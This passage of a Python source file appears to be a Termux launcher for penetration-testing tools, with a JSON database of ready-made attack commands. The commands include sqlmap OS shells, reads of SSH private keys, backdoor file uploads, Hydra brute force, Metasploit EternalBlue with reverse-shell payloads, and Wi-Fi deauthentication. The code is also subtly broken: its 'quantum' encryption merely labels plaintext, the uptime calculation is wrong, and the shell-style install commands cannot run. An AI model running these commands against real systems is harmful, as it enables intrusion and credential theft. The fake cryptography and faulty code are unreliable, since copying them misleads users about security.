#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import absolute_import
import os
import json
import subprocess
import importlib.util
import socket
import netifaces
import requests
import psutil
from pathlib import Path
from typing import Dict, List, Optional, Union, Tuple
from logging_utils import log  # Add missing import

class NetworkManager:
    def __init__(self):
        self.log = Log()

    def get_network_info(self) -> Dict:
        info = {
            'hostname': socket.gethostname(),
            'interfaces': {},
            'public_ip': self.get_public_ip(),
            'dns': socket.gethostbyname_ex(socket.gethostname())[-1]
        }

        for interface in netifaces.interfaces():
            try:
                info['interfaces'][interface] = netifaces.ifaddresses(interface)
            except ValueError as e:
                self.log.log_error(f"Error retrieving interface info: {str(e)}")

        return info

    def get_public_ip(self) -> str:
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except requests.RequestException:
            return "Unable to determine"

    def port_scan(self, host: str, ports: Union[List[int], range]) -> Dict[int, str]:
        results = {}
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((host, port))
                    results[port] = "open" if result == 0 else "closed"
            except socket.error as e:
                self.log.log_error(f"Error scanning port {port}: {str(e)}")
        return results

    def check_connection(self, host: str, port: int, timeout: int = 3) -> bool:
        try:
            socket.create_connection((host, port), timeout=timeout)
            return True
        except (socket.timeout, ConnectionRefusedError):
            return False

class PackageInstaller:
    def install(self, tool_name: str, install_config: Dict) -> bool:
        preferred_method = install_config.get('preferred')
        commands = install_config.get('commands', {})
        
        if not commands:
            return False
        
        if preferred_method in commands:
            cmd = commands[preferred_method]
            if self._run_install_command(cmd):
                return True
        
        for method, cmd in commands.items():
            if method == preferred_method:
                continue
            if self._run_install_command(cmd):
                return True
        
        return False

    def _run_install_command(self, cmd: List[str]) -> bool:
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            if result.returncode == 0:
                return True
            print(f"Installation failed: {result.stderr}")
        except Exception as e:
            print(f"Error during installation: {str(e)}")
        return False

class CommandDatabase:
    def __init__(self):
        self.command_patterns = {}
        self.parameters = {}
        self.analysis_rules = {}
        self.help_texts = {}

    def load_from_file(self, filename: str):
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
                self.command_patterns = data.get('command_patterns', {})
                self.parameters = data.get('parameters', {})
                self.analysis_rules = data.get('analysis_rules', {})
                self.help_texts = data.get('help_texts', {})
        except (FileNotFoundError, json.JSONDecodeError):
            self.command_patterns = {}
            self.parameters = {}
            self.analysis_rules = {}
            self.help_texts = {}

    def get_command_patterns(self, tool_name: str) -> Dict:
        return self.command_patterns.get(tool_name, {})

    def get_parameters(self, tool_name: str, command_name: str) -> Dict:
        return self.parameters.get(f"{tool_name}.{command_name}", {})

    def get_analysis_rules(self, tool_name: str, command_name: str) -> Dict:
        return self.analysis_rules.get(f"{tool_name}.{command_name}", {})

    def get_tool_help(self, tool_name: str) -> str:
        return self.help_texts.get(tool_name, "")

    def get_command(self, tool_name: str, command_name: str) -> Optional[Dict]:
        patterns = self.get_command_patterns(tool_name)
        if command_name not in patterns:
            return None
        return {
            'name': command_name,
            'template': patterns[command_name],
            'parameters': self.get_parameters(tool_name, command_name)
        }

class Log:
    @staticmethod
    def log_error(message: str, color: str = "red"):
        print(f"\033[91m[ERROR] {message}\033[0m")

    @staticmethod
    def log_success(message: str):
        print(f"\033[92m[SUCCESS] {message}\033[0m")

    @staticmethod
    def log_info(message: str):
        print(f"\033[94m[INFO] {message}\033[0m")

    @staticmethod
    def log_warning(message: str):
        print(f"\033[93m[WARNING] {message}\033[0m")

class CryptoQuantumSecure:
    @staticmethod
    def encrypt(data: str) -> str:
        return f"QUANTUM_ENCRYPTED({data})"

    @staticmethod
    def decrypt(encrypted_data: str) -> str:
        if encrypted_data.startswith("QUANTUM_ENCRYPTED("):
            return encrypted_data[18:-1]
        return encrypted_data

class SystemMonitor:
    def __init__(self):
        self.log = Log()

    def get_system_stats(self) -> Dict:
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            return {
                'cpu_usage': round(cpu_usage, 1),
                'memory_usage': round(mem.percent, 1),
                'disk_usage': round(disk.percent, 1),
                'uptime': self.get_uptime(),
                'processes': len(psutil.pids())
            }
        except Exception as e:
            self.log.log_error(f"Error getting system stats: {str(e)}")
            return {}

    def get_uptime(self) -> str:
        try:
            uptime_seconds = psutil.boot_time()
            minutes, seconds = divmod(uptime_seconds, 60)
            hours, minutes = divmod(minutes, 60)
            days, hours = divmod(hours, 24)
            return f"{int(days)}d {int(hours)}h {int(minutes)}m"
        except Exception:
            return "Unknown"

class ToolManager:
    def __init__(self):
        self.HOME = str(Path.home())
        self.TOOLS_DIR = os.path.join(self.HOME, ".termux_tools")
        self.TOOLS_DATA_FILE = os.path.join(self.TOOLS_DIR, "tools_data.json")
        self.TERMUX_TOOLS_FILE = os.path.join(self.TOOLS_DIR, "termux_tools.json")
        self.TERMUX_EXAMPLES_FILE = os.path.join(self.TOOLS_DIR, "termux_examples.json")
        self.COMMAND_DB_FILE = os.path.join(self.TOOLS_DIR, "command_db.json")

        os.makedirs(self.TOOLS_DIR, exist_ok=True)

        self.installer = PackageInstaller()
        self.command_db = CommandDatabase()
        self.command_db.load_from_file(self.COMMAND_DB_FILE)
        self.log = log
        self.crypto = CryptoQuantumSecure()
        self.network = NetworkManager()
        self.monitor = SystemMonitor()
        
        self.initialize_database()
        
        self.available_tools = self.load_tool_db()
        self.installed_tools = self.scan_installed_tools()

    def initialize_database(self):
        if not os.path.exists(self.TOOLS_DATA_FILE):
            with open(self.TOOLS_DATA_FILE, 'w') as f:
                json.dump({
                    "available": [
                        "EA", "nmap", "sqlmap", "metasploit", "hydra", "john", "aircrack-ng", 
                        "wpscan", "gobuster", "hashcat", "nikto", "dirb", "wireshark", 
                        "tshark", "ettercap", "dnsenum", "theHarvester", "sherlock", 
                        "recon-ng", "maltego", "metagoofil", "spiderfoot", "skipfish", 
                        "wapiti", "whatweb", "joomscan", "droopescan", "commix", 
                        "xsstrike", "sslyze", "testssl.sh", "lynis", "chkrootkit", "rkhunter"
                    ],
                    "installed": ["nmap", "sqlmap", "john", "wpscan"]
                }, f, indent=2)
        
        if not os.path.exists(self.TERMUX_TOOLS_FILE):
            with open(self.TERMUX_TOOLS_FILE, 'w') as f:
                json.dump({
                    "available_tools": [
                        {
                            "name": "EA",
                            "category": "Comprehensive Testing",
                            "version": "2.5.0",
                            "description": "Advanced penetration testing framework with multiple scanning modes",
                            "dependencies": ["python3", "git"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/ea-tool/ea.git", "&&", "cd", "ea", "&&", "pip", "install", "-r", "requirements.txt"],
                                    "pkg": ["pkg", "install", "ea"],
                                    "apt": ["apt", "install", "ea-tool"],
                                    "pip": ["pip", "install", "ea-toolkit"]
                                }
                            },
                            "examples": [
                                "ea -t 192.168.1.1",
                                "ea -t example.com -p 80,443",
                                "ea -t 192.168.1.1-100 -f",
                                "ea -t 192.168.1.1 -vuln -e"
                            ]
                        },
                        {
                            "name": "nmap",
                            "category": "Network Scanning",
                            "version": "7.93",
                            "description": "Network discovery and security auditing tool",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "nmap"],
                                    "apt": ["apt", "install", "nmap"],
                                    "pip": ["pip", "install", "python-nmap"]
                                }
                            }
                        },
                        {
                            "name": "sqlmap",
                            "category": "SQL Injection",
                            "version": "1.6.12",
                            "description": "Automatic SQL injection and database takeover tool",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "--depth", "1", "https://github.com/sqlmapproject/sqlmap.git"],
                                    "pkg": ["pkg", "install", "sqlmap"],
                                    "pip": ["pip", "install", "sqlmap"]
                                }
                            }
                        },
                        {
                            "name": "metasploit",
                            "category": "Exploitation",
                            "version": "6.1",
                            "description": "Penetration testing framework with exploit database",
                            "dependencies": ["curl", "ruby"],
                            "install": {
                                "preferred": "curl",
                                "commands": {
                                    "curl": ["curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb", ">", "msfinstall", "&&", "chmod", "+x", "msfinstall", "&&", "./msfinstall"],
                                    "pkg": ["pkg", "install", "metasploit"]
                                }
                            }
                        },
                        {
                            "name": "hydra",
                            "category": "Password Cracking",
                            "version": "9.3",
                            "description": "Parallelized login cracker supporting numerous protocols",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "hydra"],
                                    "apt": ["apt", "install", "hydra"],
                                    "pip": ["pip", "install", "hydra"]
                                }
                            }
                        },
                        {
                            "name": "john",
                            "category": "Password Cracking",
                            "version": "1.9.0",
                            "description": "John the Ripper password cracker",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "john"],
                                    "apt": ["apt", "install", "john"],
                                    "pip": ["pip", "install", "john"]
                                }
                            }
                        },
                        {
                            "name": "aircrack-ng",
                            "category": "Wireless",
                            "version": "1.6",
                            "description": "WiFi security auditing tools suite",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "aircrack-ng"],
                                    "apt": ["apt", "install", "aircrack-ng"],
                                    "pip": ["pip", "install", "aircrack-ng"]
                                }
                            }
                        },
                        {
                            "name": "wpscan",
                            "category": "Web Application",
                            "version": "3.8.22",
                            "description": "WordPress vulnerability scanner",
                            "dependencies": ["ruby"],
                            "install": {
                                "preferred": "gem",
                                "commands": {
                                    "gem": ["gem", "install", "wpscan"],
                                    "pkg": ["pkg", "install", "wpscan"],
                                    "apt": ["apt", "install", "wpscan"]
                                }
                            }
                        },
                        {
                            "name": "gobuster",
                            "category": "Web Application",
                            "version": "3.1.0",
                            "description": "Directory/file brute-forcing tool",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "gobuster"],
                                    "apt": ["apt", "install", "gobuster"],
                                    "pip": ["pip", "install", "gobuster"]
                                }
                            }
                        },
                        {
                            "name": "hashcat",
                            "category": "Password Cracking",
                            "version": "6.2.5",
                            "description": "Advanced password recovery tool",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "hashcat"],
                                    "apt": ["apt", "install", "hashcat"],
                                    "pip": ["pip", "install", "hashcat"]
                                }
                            }
                        },
                        {
                            "name": "nikto",
                            "category": "Web Application",
                            "version": "2.1.6",
                            "description": "Web server scanner",
                            "dependencies": ["perl"],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "nikto"],
                                    "apt": ["apt", "install", "nikto"],
                                    "pip": ["pip", "install", "nikto"]
                                }
                            }
                        },
                        {
                            "name": "dirb",
                            "category": "Web Application",
                            "version": "2.22",
                            "description": "Web content scanner",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "dirb"],
                                    "apt": ["apt", "install", "dirb"],
                                    "pip": ["pip", "install", "dirb"]
                                }
                            }
                        },
                        {
                            "name": "wireshark",
                            "category": "Network Analysis",
                            "version": "3.6.7",
                            "description": "Network protocol analyzer",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "wireshark"],
                                    "apt": ["apt", "install", "wireshark"],
                                    "pip": ["pip", "install", "wireshark"]
                                }
                            }
                        },
                        {
                            "name": "tshark",
                            "category": "Network Analysis",
                            "version": "3.6.7",
                            "description": "Terminal-based Wireshark",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "tshark"],
                                    "apt": ["apt", "install", "tshark"],
                                    "pip": ["pip", "install", "tshark"]
                                }
                            }
                        },
                        {
                            "name": "ettercap",
                            "category": "Network Analysis",
                            "version": "0.8.3",
                            "description": "Comprehensive suite for MITM attacks",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "ettercap"],
                                    "apt": ["apt", "install", "ettercap"],
                                    "pip": ["pip", "install", "ettercap"]
                                }
                            }
                        },
                        {
                            "name": "dnsenum",
                            "category": "DNS Analysis",
                            "version": "1.2.6",
                            "description": "DNS enumeration tool",
                            "dependencies": ["perl"],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "dnsenum"],
                                    "apt": ["apt", "install", "dnsenum"],
                                    "pip": ["pip", "install", "dnsenum"]
                                }
                            }
                        },
                        {
                            "name": "theHarvester",
                            "category": "Reconnaissance",
                            "version": "4.0.3",
                            "description": "Email, subdomain and name harvester",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/laramies/theHarvester.git", "&&", "cd", "theHarvester", "&&", "pip", "install", "-r", "requirements.txt"],
                                    "pkg": ["pkg", "install", "theharvester"],
                                    "apt": ["apt", "install", "theharvester"],
                                    "pip": ["pip", "install", "theharvester"]
                                }
                            }
                        },
                        {
                            "name": "sherlock",
                            "category": "Reconnaissance",
                            "version": "0.14.3",
                            "description": "Hunt down social media accounts by username",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/sherlock-project/sherlock.git", "&&", "cd", "sherlock", "&&", "pip", "install", "-r", "requirements.txt"],
                                    "pkg": ["pkg", "install", "sherlock"],
                                    "apt": ["apt", "install", "sherlock"],
                                    "pip": ["pip", "install", "sherlock"]
                                }
                            }
                        },
                        {
                            "name": "recon-ng",
                            "category": "Reconnaissance",
                            "version": "5.1.2",
                            "description": "Full-featured web reconnaissance framework",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/lanmaster53/recon-ng.git", "&&", "cd", "recon-ng", "&&", "pip", "install", "-r", "REQUIREMENTS"],
                                    "pkg": ["pkg", "install", "recon-ng"],
                                    "apt": ["apt", "install", "recon-ng"],
                                    "pip": ["pip", "install", "recon-ng"]
                                }
                            }
                        },
                        {
                            "name": "maltego",
                            "category": "Reconnaissance",
                            "version": "4.3.0",
                            "description": "Interactive data mining tool",
                            "dependencies": ["java"],
                            "install": {
                                "preferred": "curl",
                                "commands": {
                                    "curl": ["curl", "-L", "https://maltego-downloads.s3.us-east-2.amazonaws.com/linux/Maltego.v4.3.0.deb", "-o", "maltego.deb", "&&", "dpkg", "-i", "maltego.deb"],
                                    "pkg": ["pkg", "install", "maltego"],
                                    "apt": ["apt", "install", "maltego"]
                                }
                            }
                        },
                        {
                            "name": "metagoofil",
                            "category": "Reconnaissance",
                            "version": "2.2",
                            "description": "Metadata harvester",
                            "dependencies": ["python2"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/laramies/metagoofil.git"],
                                    "pkg": ["pkg", "install", "metagoofil"],
                                    "apt": ["apt", "install", "metagoofil"]
                                }
                            }
                        },
                        {
                            "name": "spiderfoot",
                            "category": "Reconnaissance",
                            "version": "4.0",
                            "description": "Automated OSINT collection tool",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "pip",
                                "commands": {
                                    "pip": ["pip", "install", "spiderfoot"],
                                    "pkg": ["pkg", "install", "spiderfoot"],
                                    "apt": ["apt", "install", "spiderfoot"]
                                }
                            }
                        },
                        {
                            "name": "skipfish",
                            "category": "Web Application",
                            "version": "2.10b",
                            "description": "Web application security scanner",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "skipfish"],
                                    "apt": ["apt", "install", "skipfish"],
                                    "pip": ["pip", "install", "skipfish"]
                                }
                            }
                        },
                        {
                            "name": "wapiti",
                            "category": "Web Application",
                            "version": "3.0.4",
                            "description": "Web application vulnerability scanner",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "pip",
                                "commands": {
                                    "pip": ["pip", "install", "wapiti3"],
                                    "pkg": ["pkg", "install", "wapiti"],
                                    "apt": ["apt", "install", "wapiti"]
                                }
                            }
                        },
                        {
                            "name": "whatweb",
                            "category": "Web Application",
                            "version": "0.5.5",
                            "description": "Website technology identifier",
                            "dependencies": ["ruby"],
                            "install": {
                                "preferred": "gem",
                                "commands": {
                                    "gem": ["gem", "install", "whatweb"],
                                    "pkg": ["pkg", "install", "whatweb"],
                                    "apt": ["apt", "install", "whatweb"]
                                }
                            }
                        },
                        {
                            "name": "joomscan",
                            "category": "Web Application",
                            "version": "0.0.7",
                            "description": "Joomla vulnerability scanner",
                            "dependencies": ["perl"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/rezasp/joomscan.git"],
                                    "pkg": ["pkg", "install", "joomscan"],
                                    "apt": ["apt", "install", "joomscan"]
                                }
                            }
                        },
                        {
                            "name": "droopescan",
                            "category": "Web Application",
                            "version": "1.45.1",
                            "description": "Drupal scanner",
                            "dependencies": ["python2"],
                            "install": {
                                "preferred": "pip",
                                "commands": {
                                    "pip": ["pip", "install", "droopescan"],
                                    "pkg": ["pkg", "install", "droopescan"],
                                    "apt": ["apt", "install", "droopescan"]
                                }
                            }
                        },
                        {
                            "name": "commix",
                            "category": "Web Application",
                            "version": "3.1",
                            "description": "Automated command injection tool",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/commixproject/commix.git", "&&", "cd", "commix", "&&", "pip", "install", "-r", "requirements.txt"],
                                    "pkg": ["pkg", "install", "commix"],
                                    "apt": ["apt", "install", "commix"],
                                    "pip": ["pip", "install", "commix"]
                                }
                            }
                        },
                        {
                            "name": "xsstrike",
                            "category": "Web Application",
                            "version": "3.1.5",
                            "description": "Advanced XSS detection suite",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "https://github.com/s0md3v/XSStrike.git", "&&", "cd", "XSStrike", "&&", "pip", "install", "-r", "requirements.txt"],
                                    "pkg": ["pkg", "install", "xsstrike"],
                                    "apt": ["apt", "install", "xsstrike"],
                                    "pip": ["pip", "install", "xsstrike"]
                                }
                            }
                        },
                        {
                            "name": "sslyze",
                            "category": "Network Security",
                            "version": "5.0.5",
                            "description": "SSL/TLS configuration scanner",
                            "dependencies": ["python3"],
                            "install": {
                                "preferred": "pip",
                                "commands": {
                                    "pip": ["pip", "install", "sslyze"],
                                    "pkg": ["pkg", "install", "sslyze"],
                                    "apt": ["apt", "install", "sslyze"]
                                }
                            }
                        },
                        {
                            "name": "testssl.sh",
                            "category": "Network Security",
                            "version": "3.0.8",
                            "description": "TLS/SSL encryption checker",
                            "dependencies": ["bash"],
                            "install": {
                                "preferred": "git",
                                "commands": {
                                    "git": ["git", "clone", "--depth", "1", "https://github.com/drwetter/testssl.sh.git"],
                                    "pkg": ["pkg", "install", "testssl.sh"],
                                    "apt": ["apt", "install", "testssl.sh"]
                                }
                            }
                        },
                        {
                            "name": "lynis",
                            "category": "Security Auditing",
                            "version": "3.0.7",
                            "description": "Security auditing tool for Unix/Linux systems",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "lynis"],
                                    "apt": ["apt", "install", "lynis"],
                                    "pip": ["pip", "install", "lynis"]
                                }
                            }
                        },
                        {
                            "name": "chkrootkit",
                            "category": "Security Auditing",
                            "version": "0.55",
                            "description": "Rootkit detector",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "chkrootkit"],
                                    "apt": ["apt", "install", "chkrootkit"],
                                    "pip": ["pip", "install", "chkrootkit"]
                                }
                            }
                        },
                        {
                            "name": "rkhunter",
                            "category": "Security Auditing",
                            "version": "1.4.6",
                            "description": "Rootkit, backdoor and exploit scanner",
                            "dependencies": [],
                            "install": {
                                "preferred": "pkg",
                                "commands": {
                                    "pkg": ["pkg", "install", "rkhunter"],
                                    "apt": ["apt", "install", "rkhunter"],
                                    "pip": ["pip", "install", "rkhunter"]
                                }
                            }
                        }
                    ]
                }, f, indent=2)
        
        if not os.path.exists(self.TERMUX_EXAMPLES_FILE):
            with open(self.TERMUX_EXAMPLES_FILE, 'w') as f:
                json.dump({
                    "nmap": {
                        "Basic Scan": [
                            "nmap 192.168.1.1",
                            "nmap example.com",
                            "nmap 192.168.1.1-10"
                        ],
                        "Stealth Scan": [
                            "nmap -sS 192.168.1.1",
                            "nmap -sS -T2 192.168.1.1",
                            "nmap -sS -f 192.168.1.1"
                        ],
                        "Version Detection": [
                            "nmap -sV 192.168.1.1",
                            "nmap -sV --version-intensity 5 192.168.1.1",
                            "nmap -sV --version-all 192.168.1.1"
                        ],
                        "OS Detection": [
                            "nmap -O 192.168.1.1",
                            "nmap -O --osscan-limit 192.168.1.1",
                            "nmap -O --osscan-guess 192.168.1.1"
                        ],
                        "Aggressive Scan": [
                            "nmap -A 192.168.1.1",
                            "nmap -A -T4 192.168.1.1",
                            "nmap -A -sC 192.168.1.1"
                        ],
                        "Port Scan": [
                            "nmap -p 80 192.168.1.1",
                            "nmap -p 1-1000 192.168.1.1",
                            "nmap -p- 192.168.1.1"
                        ],
                        "Decoy Scan": [
                            "nmap -D RND:10 192.168.1.1",
                            "nmap -D 192.168.1.1,192.168.1.2 192.168.1.1",
                            "nmap -D ME 192.168.1.1"
                        ],
                        "UDP Scan": [
                            "nmap -sU 192.168.1.1",
                            "nmap -sU -p 53 192.168.1.1",
                            "nmap -sU -p 1-100 192.168.1.1"
                        ],
                        "Script Scan": [
                            "nmap -sC 192.168.1.1",
                            "nmap --script vuln 192.168.1.1",
                            "nmap --script http-enum 192.168.1.1"
                        ],
                        "Firewall Evasion": [
                            "nmap -f 192.168.1.1",
                            "nmap --mtu 24 192.168.1.1",
                            "nmap --badsum 192.168.1.1"
                        ]
                    },
                    "sqlmap": {
                        "Basic Scan": [
                            "sqlmap -u http://example.com/page?id=1",
                            "sqlmap -u http://example.com/page?id=1 --batch",
                            "sqlmap -u http://example.com/page?id=1 --level=5"
                        ],
                        "Database Enumeration": [
                            "sqlmap -u http://example.com/page?id=1 --dbs",
                            "sqlmap -u http://example.com/page?id=1 --dbs --threads=10",
                            "sqlmap -u http://example.com/page?id=1 --dbs --risk=3"
                        ],
                        "Table Enumeration": [
                            "sqlmap -u http://example.com/page?id=1 -D mydb --tables",
                            "sqlmap -u http://example.com/page?id=1 -D mydb --tables --threads=10",
                            "sqlmap -u http://example.com/page?id=1 -D mydb --tables --risk=3"
                        ],
                        "Column Enumeration": [
                            "sqlmap -u http://example.com/page?id=1 -D mydb -T users --columns",
                            "sqlmap -u http://example.com/page?id=1 -D mydb -T users --columns --threads=10",
                            "sqlmap -u http://example.com/page?id=1 -D mydb -T users --columns --risk=3"
                        ],
                        "Data Dump": [
                            "sqlmap -u http://example.com/page?id=1 -D mydb -T users --dump",
                            "sqlmap -u http://example.com/page?id=1 -D mydb -T users --dump --threads=10",
                            "sqlmap -u http://example.com/page?id=1 -D mydb -T users --dump --risk=3"
                        ],
                        "OS Shell": [
                            "sqlmap -u http://example.com/page?id=1 --os-shell",
                            "sqlmap -u http://example.com/page?id=1 --os-shell --batch",
                            "sqlmap -u http://example.com/page?id=1 --os-shell --level=5"
                        ],
                        "File Read": [
                            "sqlmap -u http://example.com/page?id=1 --file-read=/etc/passwd",
                            "sqlmap -u http://example.com/page?id=1 --file-read=/var/www/html/config.php",
                            "sqlmap -u http://example.com/page?id=1 --file-read=/root/.ssh/id_rsa"
                        ],
                        "File Write": [
                            "sqlmap -u http://example.com/page?id=1 --file-write=shell.php --file-dest=/var/www/html/shell.php",
                            "sqlmap -u http://example.com/page?id=1 --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php",
                            "sqlmap -u http://example.com/page?id=1 --file-write=exploit.py --file-dest=/var/www/html/exploit.py"
                        ]
                    },
                    "hydra": {
                        "SSH Brute Force": [
                            "hydra -l admin -P passwords.txt ssh://192.168.1.1",
                            "hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.1",
                            "hydra -l admin -P passwords.txt -s 22 ssh://192.168.1.1"
                        ],
                        "FTP Brute Force": [
                            "hydra -l admin -P passwords.txt ftp://192.168.1.1",
                            "hydra -l admin -P passwords.txt -t 4 ftp://192.168.1.1",
                            "hydra -l admin -P passwords.txt -s 21 ftp://192.168.1.1"
                        ],
                        "HTTP Form Brute Force": [
                            "hydra -l admin -P passwords.txt 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid credentials'",
                            "hydra -l admin -P passwords.txt -t 4 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid credentials'",
                            "hydra -l admin -P passwords.txt -s 80 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid credentials'"
                        ],
                        "RDP Brute Force": [
                            "hydra -l admin -P passwords.txt rdp://192.168.1.1",
                            "hydra -l admin -P passwords.txt -t 4 rdp://192.168.1.1",
                            "hydra -l admin -P passwords.txt -s 3389 rdp://192.168.1.1"
                        ],
                        "MySQL Brute Force": [
                            "hydra -l admin -P passwords.txt mysql://192.168.1.1",
                            "hydra -l admin -P passwords.txt -t 4 mysql://192.168.1.1",
                            "hydra -l admin -P passwords.txt -s 3306 mysql://192.168.1.1"
                        ]
                    },
                    "metasploit": {
                        "Start Metasploit": [
                            "msfconsole",
                            "msfconsole -q",
                            "msfconsole -x 'help'"
                        ],
                        "Search Exploit": [
                            "msfconsole -x 'search eternalblue'",
                            "msfconsole -x 'search type:exploit eternalblue'",
                            "msfconsole -x 'search type:auxiliary ssh_login'"
                        ],
                        "Use Exploit": [
                            "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'",
                            "msfconsole -x 'use auxiliary/scanner/ssh/ssh_login'",
                            "msfconsole -x 'use exploit/multi/handler'"
                        ],
                        "Set Payload": [
                            "msfconsole -x 'set payload windows/x64/meterpreter/reverse_tcp'",
                            "msfconsole -x 'set payload linux/x86/shell/reverse_tcp'",
                            "msfconsole -x 'set payload java/meterpreter/reverse_tcp'"
                        ],
                        "Set Options": [
                            "msfconsole -x 'set RHOSTS 192.168.1.1'",
                            "msfconsole -x 'set LHOST 192.168.1.2'",
                            "msfconsole -x 'set LPORT 4444'"
                        ],
                        "Run Exploit": [
                            "msfconsole -x 'run'",
                            "msfconsole -x 'exploit'",
                            "msfconsole -x 'run -j'"
                        ]
                    },
                    "nikto": {
                        "Basic Scan": [
                            "nikto -h http://example.com",
                            "nikto -h http://example.com -output scan.txt",
                            "nikto -h http://example.com -Format txt"
                        ],
                        "Port Scan": [
                            "nikto -h http://example.com -p 80",
                            "nikto -h http://example.com -p 80,443",
                            "nikto -h http://example.com -p 1-1000"
                        ],
                        "SSL Scan": [
                            "nikto -h https://example.com -ssl",
                            "nikto -h https://example.com -ssl -Cgidirs all",
                            "nikto -h https://example.com -ssl -Tuning 1,2,3,4,5"
                        ],
                        "Aggressive Scan": [
                            "nikto -h http://example.com -Tuning 1,2,3,4,5",
                            "nikto -h http://example.com -Tuning x",
                            "nikto -h http://example.com -Tuning b"
                        ]
                    },
                    "wpscan": {
                        "Basic Scan": [
                            "wpscan --url http://example.com",
                            "wpscan --url http://example.com --enumerate p",
                            "wpscan --url http://example.com --enumerate t"
                        ],
                        "Plugin Enumeration": [
                            "wpscan --url http://example.com --enumerate p",
                            "wpscan --url http://example.com --enumerate vp",
                            "wpscan --url http://example.com --enumerate ap"
                        ],
                        "Theme Enumeration": [
                            "wpscan --url http://example.com --enumerate t",
                            "wpscan --url http://example.com --enumerate vt",
                            "wpscan --url http://example.com --enumerate at"
                        ],
                        "User Enumeration": [
                            "wpscan --url http://example.com --enumerate u",
                            "wpscan --url http://example.com --enumerate m",
                            "wpscan --url http://example.com --enumerate u1-10"
                        ],
                        "Brute Force": [
                            "wpscan --url http://example.com --passwords passwords.txt",
                            "wpscan --url http://example.com --passwords passwords.txt --usernames users.txt",
                            "wpscan --url http://example.com --passwords passwords.txt --threads 10"
                        ]
                    },
                    "aircrack-ng": {
                        "Capture Handshake": [
                            "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0",
                            "airodump-ng -c 1-11 --bssid 00:11:22:33:44:55 -w capture wlan0",
                            "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0 --output-format pcap"
                        ],
                        "Crack Handshake": [
                            "aircrack-ng -w passwords.txt -b 00:11:22:33:44:55 capture-01.cap",
                            "aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 capture-01.cap",
                            "aircrack-ng -w passwords.txt -b 00:11:22:33:44:55 capture-01.cap -l key.txt"
                        ],
                        "Deauthentication Attack": [
                            "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0",
                            "aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0",
                            "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0 --ignore-negative-one"
                        ]
                    },
                    "john": {
                        "Crack Password Hash": [
                            "john --wordlist=passwords.txt hashes.txt",
                            "john --wordlist=rockyou.txt hashes.txt",
                            "john --wordlist=passwords.txt --format=raw-md5 hashes.txt"
                        ],
                        "Show Cracked Passwords": [
                            "john --show hashes.txt",
                            "john --show --format=raw-md5 hashes.txt",
                            "john --show --format=sha1 hashes.txt"
                        ],
                        "Incremental Mode": [
